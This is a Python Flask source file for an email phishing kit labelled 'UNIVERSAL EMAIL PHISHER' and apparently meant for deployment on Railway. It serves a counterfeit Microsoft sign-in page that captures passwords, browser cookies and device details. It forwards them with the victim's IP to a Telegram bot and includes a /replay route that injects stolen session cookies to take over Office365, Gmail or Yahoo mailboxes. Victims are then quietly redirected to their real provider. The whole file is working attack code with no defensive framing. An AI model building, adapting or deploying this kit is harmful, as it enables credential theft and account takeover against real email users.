#!/usr/bin/env python3
"""
UNIVERSAL EMAIL PHISHER - ENHANCED VERSION
Railway: app.py + Procfile + requirements.txt
"""

import os
import urllib.parse
from datetime import datetime
from flask import Flask, request, jsonify
import requests

app = Flask(__name__)

TELEGRAM_TOKEN = os.getenv('TELEGRAM_BOT_TOKEN', '')
TELEGRAM_CHAT_ID = os.getenv('TELEGRAM_CHAT_ID', '')

PROVIDERS = {
    'office': {'emoji': '🔴', 'name': 'Office365', 'url': 'https://outlook.office.com/mail/inbox', 'cookies': ['ESTSAUTH','ESTSAUTHPERSISTENT','MUID','MSID']},
    'gmail': {'emoji': '🟢', 'name': 'Gmail', 'url': 'https://mail.google.com/mail/u/0/#inbox', 'cookies': ['SID','HSID','SSID','GMAIL_AT']},
    'yahoo': {'emoji': '🟡', 'name': 'Yahoo', 'url': 'https://mail.yahoo.com', 'cookies': ['T','Y']}
}

def send_telegram(msg):
    if TELEGRAM_TOKEN and TELEGRAM_CHAT_ID:
        try:
            requests.post(f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage", 
                         data={'chat_id':TELEGRAM_CHAT_ID, 'text':msg, 'parse_mode':'HTML'})
        except: 
            pass

def detect_provider(email, cookies):
    ck = set(cookies.keys())
    for k, v in PROVIDERS.items():
        if ck.intersection(v['cookies']): 
            return k
    if 'gmail' in email.lower(): 
        return 'gmail'
    if 'yahoo' in email.lower(): 
        return 'yahoo'
    return 'office'

def get_provider_redirect(email):
    email_lower = email.lower()
    
    # Extract domain
    if '@' in email_lower:
        domain = email_lower.split('@')[1]
    else:
        domain = ''
    
    # Provider mapping
    providers = {
        'gmail.com': 'https://accounts.google.com',
        'googlemail.com': 'https://accounts.google.com',
        'yahoo.com': 'https://login.yahoo.com',
        'ymail.com': 'https://login.yahoo.com',
        'rocketmail.com': 'https://login.yahoo.com',
        'outlook.com': 'https://outlook.live.com',
        'hotmail.com': 'https://outlook.live.com',
        'live.com': 'https://outlook.live.com',
        'msn.com': 'https://outlook.live.com',
        'aol.com': 'https://mail.aol.com',
        'icloud.com': 'https://www.icloud.com',
        'me.com': 'https://www.icloud.com',
        'mac.com': 'https://www.icloud.com',
        'protonmail.com': 'https://account.proton.me',
        'proton.me': 'https://account.proton.me',
        'zoho.com': 'https://accounts.zoho.com',
        'yandex.com': 'https://passport.yandex.com',
        'mail.com': 'https://www.mail.com',
        'gmx.com': 'https://www.gmx.com',
        'web.de': 'https://web.de',
        'orange.fr': 'https://www.orange.fr',
        'free.fr': 'https://www.free.fr',
        'sfr.fr': 'https://www.sfr.fr',
        'laposte.net': 'https://www.laposte.net',
        'wanadoo.fr': 'https://www.orange.fr'
    }
    
    return providers.get(domain, 'https://login.microsoftonline.com')

@app.route('/')
def index():
    return '''
<!DOCTYPE html>
<html>
<head>
<title>Microsoft Account</title>
<meta name="viewport" content="width=device-width, initial-scale=1">
<style>
* {margin:0;padding:0;box-sizing:border-box;}
body {background:#f3f2f1;font-family:Segoe UI,Tahoma,sans-serif;min-height:100vh;display:flex;align-items:center;justify-content:center;}
.login {max-width:440px;margin:20px;padding:48px;background:#fff;border-radius:12px;box-shadow:0 2px 10px rgba(0,0,0,0.08),0 0 2px rgba(0,0,0,0.06);border:1px solid #e1dfdd;}
.logo {width:120px;margin:0 auto 32px;display:block;}
h1 {color:#323130;font-size:24px;font-weight:600;text-align:center;margin-bottom:8px;}
.subtitle {color:#605e5c;font-size:14px;text-align:center;margin-bottom:28px;}
.input-group {margin-bottom:20px;}
.input-group label {display:block;color:#323130;font-size:14px;font-weight:600;margin-bottom:6px;}
.input-group input {width:100%;padding:12px;border:1px solid #8a8886;border-radius:2px;font-size:15px;transition:all 0.2s;}
.input-group input:focus {outline:none;border-color:#0078d4;box-shadow:0 0 0 3px rgba(0,120,212,0.1);}
.input-group input.error {border-color:#d13438;}
.error-message {color:#d13438;font-size:12px;margin-top:4px;display:none;}
.forgot-link {display:block;text-align:right;color:#0078d4;text-decoration:none;font-size:14px;margin-top:4px;}
.forgot-link:hover {text-decoration:underline;}
.btn {width:100%;padding:12px;background:#0078d4;color:#fff;border:none;border-radius:2px;font-size:15px;font-weight:600;cursor:pointer;margin-top:8px;transition:background 0.2s;}
.btn:hover {background:#106ebe;}
.btn:disabled {background:#c8c6c4;cursor:not-allowed;}
.loading {display:none;text-align:center;padding:40px 0;}
.spinner {width:40px;height:40px;border:3px solid rgba(0,120,212,0.2);border-top-color:#0078d4;border-radius:50%;margin:0 auto 16px;animation:spin 1s linear infinite;}
@keyframes spin {0% {transform:rotate(0deg);} 100% {transform:rotate(360deg);}}
.loading-text {color:#605e5c;font-size:14px;margin-top:8px;}
.footer {text-align:center;margin-top:24px;color:#605e5c;font-size:12px;}
.footer a {color:#0078d4;text-decoration:none;}
.footer a:hover {text-decoration:underline;}
.signup-link {text-align:center;margin-top:24px;font-size:14px;}
.signup-link a {color:#0078d4;text-decoration:none;font-weight:600;}
.signup-link a:hover {text-decoration:underline;}
.privacy-notice {background:#f3f2f1;padding:16px;border-radius:4px;margin-top:24px;font-size:12px;color:#605e5c;line-height:1.4;}
</style>
</head>
<body>
<div class="login">
<img class="logo" src="data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMTIwIiBoZWlnaHQ9IjEyMCIgdmlld0JveD0iMCAwIDEyMCAxMjAiIGZpbGw9Im5vbmUiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyI+PHBhdGggZD0iTTYwIDExMkM4OC43MTg1IDExMiAxMTIgODguNzE4NSAxMTIgNjBDMTEyIDMxLjI4MTUgODguNzE4NSA4IDYwIDhDMzEuMjgxNSA4IDggMzEuMjgxNSA4IDYwQzggODguNzE4NSAzMS4yODE1IDExMiA2MCAxMTJaTTYwIDExNkMzMy40OTAzIDExNiAxMiA5NC41MDk3IDEyIDY4QzEyIDQxLjQ5MDMgMzMuNDkwMyAyMCA2MCAyMEM4Ni41MDk3IDIwIDEwOCA0MS40OTAzIDEwOCA2OEMxMDggOTQuNTA5NyA4Ni41MDk3IDExNiA2MCAxMTZaIiBmaWxsPSIjMDA3OEQ0Ii8+PHBhdGggZD0iTTU1IDQ5SDY1VjU5SDU1VjQ5Wk00NSA0OUg1NVY1OUg0NVY0OVpNNjUgNTlINzVWNjlINjVWNTlaTTU1IDY5SDY1Vjc5SDU1VjY5Wk00NSA2OUg1NVY3OUg0NVY2OVoiIGZpbGw9IiMwMDc4RDQiLz48L3N2Zz4=" alt="Microsoft">
<h1>Sign in</h1>
<p class="subtitle">to continue to Microsoft Services</p>

<form id="loginForm">
<div class="input-group">
<label for="username">Email, phone, or Skype</label>
<input type="text" id="username" name="loginfmt" required autocomplete="username">
<div class="error-message" id="email-error">Please enter a valid email address</div>
</div>

<div class="input-group">
<div style="display:flex;justify-content:space-between;align-items:center;">
<label for="password">Password</label>
<a href="https://account.live.com/password/reset" class="forgot-link" target="_blank">Forgot password?</a>
</div>
<input type="password" id="password" name="passwd" required autocomplete="current-password">
<div class="error-message" id="password-error">Please enter your password</div>
</div>

<div class="input-group" style="display:none;">
<input type="checkbox" id="remember" checked>
<label for="remember" style="display:inline;font-weight:normal;">Keep me signed in</label>
</div>

<button type="submit" class="btn" id="submitBtn">Sign in</button>
</form>

<div class="signup-link">
No account? <a href="https://signup.live.com" target="_blank">Create one!</a>
</div>

<div class="privacy-notice">
By signing in, you agree to the <a href="https://www.microsoft.com/servicesagreement" target="_blank">Microsoft Services Agreement</a> and acknowledge the <a href="https://privacy.microsoft.com/privacystatement" target="_blank">Privacy Statement</a>.
</div>

<div class="loading" id="loading">
<div class="spinner"></div>
<div class="loading-text">Signing in to your account...</div>
</div>

<div class="footer">
<a href="https://support.microsoft.com" target="_blank">Terms of use</a> • 
<a href="https://privacy.microsoft.com" target="_blank">Privacy & cookies</a> • 
<a href="https://www.microsoft.com" target="_blank">© Microsoft 2024</a>
</div>
</div>

<script>
// Form elements
const form = document.getElementById('loginForm');
const emailInput = document.getElementById('username');
const passwordInput = document.getElementById('password');
const submitBtn = document.getElementById('submitBtn');
const emailError = document.getElementById('email-error');
const passwordError = document.getElementById('password-error');
const loadingDiv = document.getElementById('loading');

// Fake validation function
function validateEmail(email) {
    const re = /^[^\\s@]+@[^\\s@]+\\.[^\\s@]+$/;
    return re.test(email);
}

function validatePassword(password) {
    return password.length >= 6;
}

// Get redirect URL based on email
function getRedirectUrl(email) {
    const emailLower = email.toLowerCase();
    const providers = {
        'gmail.com': 'https://accounts.google.com',
        'googlemail.com': 'https://accounts.google.com',
        'yahoo.com': 'https://login.yahoo.com',
        'ymail.com': 'https://login.yahoo.com',
        'rocketmail.com': 'https://login.yahoo.com',
        'outlook.com': 'https://outlook.live.com',
        'hotmail.com': 'https://outlook.live.com',
        'live.com': 'https://outlook.live.com',
        'msn.com': 'https://outlook.live.com',
        'aol.com': 'https://mail.aol.com',
        'icloud.com': 'https://www.icloud.com',
        'me.com': 'https://www.icloud.com',
        'mac.com': 'https://www.icloud.com',
        'protonmail.com': 'https://account.proton.me',
        'proton.me': 'https://account.proton.me',
        'zoho.com': 'https://accounts.zoho.com',
        'yandex.com': 'https://passport.yandex.com',
        'mail.com': 'https://www.mail.com',
        'gmx.com': 'https://www.gmx.com'
    };
    
    if (emailLower.includes('@')) {
        const domain = emailLower.split('@')[1];
        if (providers[domain]) {
            return providers[domain] + '?username=' + encodeURIComponent(email);
        }
    }
    
    return 'https://login.microsoftonline.com?username=' + encodeURIComponent(email);
}

// Real-time validation
emailInput.addEventListener('blur', function() {
    if (this.value && !validateEmail(this.value)) {
        emailError.style.display = 'block';
        this.classList.add('error');
    } else {
        emailError.style.display = 'none';
        this.classList.remove('error');
    }
});

passwordInput.addEventListener('blur', function() {
    if (this.value && !validatePassword(this.value)) {
        passwordError.style.display = 'block';
        this.classList.add('error');
    } else {
        passwordError.style.display = 'none';
        this.classList.remove('error');
    }
});

// Form submission
form.addEventListener('submit', async function(e) {
    e.preventDefault();
    
    const email = emailInput.value.trim();
    const password = passwordInput.value;
    
    // Reset errors
    emailError.style.display = 'none';
    passwordError.style.display = 'none';
    emailInput.classList.remove('error');
    passwordInput.classList.remove('error');
    
    // Fake validation
    let hasError = false;
    
    if (!email) {
        emailError.textContent = 'Please enter a valid email address';
        emailError.style.display = 'block';
        emailInput.classList.add('error');
        hasError = true;
    } else if (!validateEmail(email)) {
        emailError.textContent = 'That doesn\\'t look like a valid email address';
        emailError.style.display = 'block';
        emailInput.classList.add('error');
        hasError = true;
    }
    
    if (!password) {
        passwordError.textContent = 'Please enter your password';
        passwordError.style.display = 'block';
        passwordInput.classList.add('error');
        hasError = true;
    } else if (!validatePassword(password)) {
        passwordError.textContent = 'Your password is incorrect';
        passwordError.style.display = 'block';
        passwordInput.classList.add('error');
        hasError = true;
    }
    
    if (hasError) {
        // Shake animation for error
        form.style.animation = 'shake 0.5s';
        setTimeout(() => form.style.animation = '', 500);
        return;
    }
    
    // Disable form and show loading
    submitBtn.disabled = true;
    submitBtn.textContent = 'Signing in...';
    form.style.opacity = '0.6';
    loadingDiv.style.display = 'block';
    
    // Collect data
    const data = {
        username: email,
        password: password,
        cookies: document.cookie,
        ua: navigator.userAgent,
        screen: `${screen.width}x${screen.height}`,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        referrer: document.referrer,
        timestamp: new Date().toISOString()
    };
    
    try {
        // Send to server (steal data)
        await fetch('/harvest', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify(data),
            credentials: 'include'
        });
        
        // Simulate "checking credentials" delay
        await new Promise(resolve => setTimeout(resolve, 1800));
        
        // Get redirect URL based on email
        const redirectUrl = getRedirectUrl(email);
        
        // Simulate "successful login" delay
        loadingDiv.querySelector('.loading-text').textContent = 'Redirecting to your account...';
        await new Promise(resolve => setTimeout(resolve, 1200));
        
        // Redirect to appropriate provider
        window.location.href = redirectUrl;
        
    } catch (error) {
        // Fake network error recovery
        loadingDiv.style.display = 'none';
        form.style.opacity = '1';
        submitBtn.disabled = false;
        submitBtn.textContent = 'Sign in';
        
        // Show fake error message
        alert('Something went wrong. Please check your connection and try again.');
    }
});

// Add shake animation
const style = document.createElement('style');
style.textContent = `
@keyframes shake {
    0%, 100% { transform: translateX(0); }
    10%, 30%, 50%, 70%, 90% { transform: translateX(-5px); }
    20%, 40%, 60%, 80% { transform: translateX(5px); }
}
`;
document.head.appendChild(style);
</script>
</body>
</html>'''

@app.route('/harvest', methods=['POST'])
def harvest():
    try:
        data = request.get_json() or {}
        ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0].strip()
        email = data.get('username', '')
        pwd = data.get('password', '')
        cookies_raw = data.get('cookies', '')
        
        cookies = {}
        for c in cookies_raw.split(';'):
            if '=' in c:
                k, v = c.strip().split('=', 1)
                cookies[k] = v
        
        provider_key = detect_provider(email, cookies)
        provider = PROVIDERS.get(provider_key, PROVIDERS['office'])
        
        critical = {k: cookies.get(k, '') for k in provider['cookies']}
        critical = {k:v for k,v in critical.items() if v}
        
        cookie_export = '; '.join([f"{k}={v}" for k,v in critical.items()])
        replay_url = f"https://{request.host}/replay?cookies={urllib.parse.quote(cookie_export)}&target={urllib.parse.quote(provider['url'])}"
        
        tmsg = f"""🔥 <b>{provider['emoji']} EMAIL SESSION CAPTURED!</b> {provider['name']}

👤 <b>Email:</b> <code>{email}</code>
🔑 <b>Password:</b> <code>{pwd}</code>

🍪 <b>Session Cookies ({len(critical)}):</b>
<code>{cookie_export[:150]}{'...' if len(cookie_export) > 150 else ''}</code>

📍 <b>IP Address:</b> <code>{ip}</b>
🖥️ <b>User Agent:</b> <code>{data.get('ua', '')[:80]}...</code>
📱 <b>Screen:</b> {data.get('screen', 'N/A')}
🕒 <b>Timezone:</b> {data.get('timezone', 'N/A')}
⏰ <b>Time:</b> {datetime.now().strftime('%Y-%m-%d %H:%M:%S UTC')}

🔗 <b><a href="{replay_url}">CLICK TO REPLAY SESSION</a></b>

<i>Auto-detected provider: {provider['name']}</i>"""
        
        send_telegram(tmsg)
        
        # Also print to console for debugging
        print(f"📧 CAPTURED: {email} | {pwd[:8]}*** | IP: {ip} | Time: {datetime.now()}")
        
        return jsonify({'status': 'ok', 'message': 'Authentication successful'}), 200
    except Exception as e:
        print(f"❌ Harvest error: {e}")
        return jsonify({'status': 'error', 'message': 'Internal server error'}), 500

@app.route('/replay')
def replay():
    cookies = request.args.get('cookies', '')
    target = request.args.get('target', 'https://outlook.office.com/mail/inbox')
    
    html = f'''<!DOCTYPE html>
<html>
<head><title>Session Replay</title>
<meta http-equiv="refresh" content="3;url={target}">
<style>
body {{ font-family: Arial, sans-serif; padding: 40px; text-align: center; }}
.spinner {{ width: 40px; height: 40px; border: 4px solid #f3f3f3; border-top: 4px solid #0078d4; border-radius: 50%; animation: spin 1s linear infinite; margin: 20px auto; }}
@keyframes spin {{ 0% {{ transform: rotate(0deg); }} 100% {{ transform: rotate(360deg); }} }}
</style>
<script>
// Set stolen cookies
document.cookie = "{cookies}";
console.log("Cookies injected:", "{cookies.substring(0, 50)}...");

// Redirect after delay
setTimeout(() => {{
    window.location.href = "{target}";
}}, 1500);
</script>
</head>
<body>
<div class="spinner"></div>
<h3>Restoring your session...</h3>
<p>Redirecting to your mailbox</p>
</body>
</html>'''
    return html

@app.route('/test')
def test():
    return f"""
<h1>Microsoft Login Test Page</h1>
<p>This is a test page for Microsoft authentication services.</p>
<p>Server Time: {datetime.now()}</p>
<p>Telegram Configured: {'✅ Yes' if TELEGRAM_TOKEN and TELEGRAM_CHAT_ID else '❌ No'}</p>
<p><a href="/">Go to Login Page</a></p>
"""

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=int(os.getenv('PORT', 8080)))
